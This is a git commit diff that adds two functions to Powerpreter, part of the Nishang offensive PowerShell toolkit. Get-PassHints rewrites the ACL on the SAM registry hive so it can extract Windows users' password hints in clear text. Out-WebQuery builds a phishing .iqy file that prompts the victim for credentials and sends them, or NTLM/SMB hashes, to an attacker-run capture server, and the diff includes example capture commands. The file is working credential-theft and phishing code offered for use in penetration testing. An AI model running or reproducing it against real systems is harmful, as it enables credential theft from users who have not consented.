afd2289e86b8a7ceca7e2c3a715557e176043445
Nikhil "SamratAshok" Mittal <nikhil.uitrgpv@gmail.com>
2015-09-04 19:42:05 +0530

    Updated Powerpreter to add Out-WebQuery and Get-PassHints

--- powerpreter/Powerpreter.psm1
+++ powerpreter/Powerpreter.psm1
@@ -3083,6 +3083,77 @@ function DumpHashes
 }
 
 
+########################################Extract password hints of Windows Users######################################################
+function Get-PassHints { 
+<# 
+.SYNOPSIS 
+Nishang script which extracts password hint for users in clear text.
+ 
+.DESCRIPTION 
+The script extracts password hints from SAM registry hive. The script needs Administrator privs to read SAM hive.
+
+.EXAMPLE 
+PS > Get-PassHints
+ 
+.LINK 
+http://www.labofapenetrationtester.com/2015/09/extracting-windows-users-password-hints.html
+https://github.com/samratashok/nishang
+#>
+
+
+
+    #Set permissions to allow Access to SAM\SAM\Domains registry hive.
+    #http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
+    $rule = New-Object System.Security.AccessControl.RegistryAccessRule (
+    [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
+    "FullControl",
+    [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",
+    [System.Security.AccessControl.PropagationFlags]"None",
+    [System.Security.AccessControl.AccessControlType]"Allow")
+    $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
+    "SAM\SAM\Domains",
+    [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
+    [System.Security.AccessControl.RegistryRights]::ChangePermissions)
+    $acl = $key.GetAccessControl()
+    $acl.SetAccessRule($rule)
+    $key.SetAccessControl($acl)
+
+    #From powerdump from SET
+    function Get-UserName([byte[]]$V)
+    {
+        if (-not $V) {return $null};
+        $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
+        $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
+        return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
+    }
+    
+
+    #Logic for extracting password hint
+    $users = Get-ChildItem HKLM:\SAM\SAM\Domains\Account\Users\
+    $j = 0
+    foreach ($key in $users)
+    {
+
+        $value = Get-ItemProperty $key.PSPath
+        $j++
+        foreach ($hint in $value)
+        {
+            #Check for users who have passwordhint
+            if ($hint.UserPasswordHint)
+            {
+                $username = Get-UserName($hint.V)
+                $passhint = ([text.encoding]::Unicode).GetString($hint.UserPasswordHint)
+                Write-Output "$username`:$passhint"
+            }
+        }
+    }
+
+    #Remove the permissions added above.
+    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+    $acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null
+    Set-Acl HKLM:\SAM\SAM\Domains $acl
+}
+
 
 ####################################Download and Execute a powershell script#########################################################
 
@@ -5506,6 +5577,80 @@ http://blog.trendmicro.com/trendlabs-security-intelligence/black-magic-windows-p
     Write-Output "The Shortcut file has been written as $OutputPath"
 
 }
+
+
+######################################Out-WebQury#############################################
+function Out-WebQuery
+{
+<#
+.SYNOPSIS
+Nishang script which creates a Web Query (.iqy) file which can be used for phishing attacks.
+
+.DESCRIPTION
+The script generates a Web Query (.iqy). When a target opens the file, it is opened inside an Excel Sheet and the
+user is presented with a warning for enabling data connection. If the user allows it, he is presented with a prompt 
+which asks for credentials. As soon as the user enters the credentials, it is sent to the remote server specified 
+while generating the file.
+
+The attacker must run a web server which is able to log the requests made to it by the targets. While any regular web
+server can be used, Start-CaptureServer.ps1 in the Utility directory of Nishang could be used as well. Start-CaptureServer
+supports Basic auth for capturing credentials in plain and NTLM authentication for capturing hashes.
+
+.PARAMETER URL
+URL to which the connection from the target is made. A web server which logs requests must run at this URL.
+
+.PARAMETER Message
+Message which will be shown to the user after he enables the Data Connection.
+
+.PARAMETER OutputPath
+Path to the .iqy file to be generated. Default is with the name QueryData.iqy in the current directory.
+
+.EXAMPLE
+PS > Out-WebQuery -URL http://192.168.1.2/
+
+Use above command to generate a Web Query file. When a user opens it and enables data connection, 
+a credentials prompt will be shown to him. The credentials entered could be captured on the listener machine
+using Start-CaptureServer script from Nishang.
+
+To capture credentials in plain, run below command on the attacker's machine:
+Start-CaptureServer -AuthType Basic -IPAddress 192.168.230.1 -LogFilePath C:\test\log.txt
+
+To capture hashes
+Start-CaptureServer -AuthType NTLM2 -IPAddress 192.168.230.1 -LogFilePath C:\test\log.txt
+
+PS > Out-WebQuery -URL \\192.168.1.2\C$
+
+Use above command to generate a Web Query file. When a user opens it, his SMB hash would be captured
+on the attacker's machine where Start-CaptureServer is running.
+
+
+.LINK
+http://www.labofapenetrationtester.com/2015/08/abusing-web-query-iqy-files.html
+https://github.com/samratashok/nishang
+https://twitter.com/subTee/status/631509345918783489
+https://support.microsoft.com/en-us/kb/157482
+#>
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $URL,
+
+        [Parameter(Position = 1, Mandatory = $False)]
+        [String]
+        $OutputPath = "$pwd\QueryData.iqy"
+
+    )
+    $iqycontent = @"
+WEB 
+1 
+$URL
+"@
+
+    Out-File -FilePath $OutputPath -InputObject $iqycontent -Encoding ascii
+    Write-Output "The Web Query file has been written as $OutputPath"
+
+}
+
 ##################################End of Client Side Attack functions###############################
 
 ##################################### Gupt Backdoor #################################################
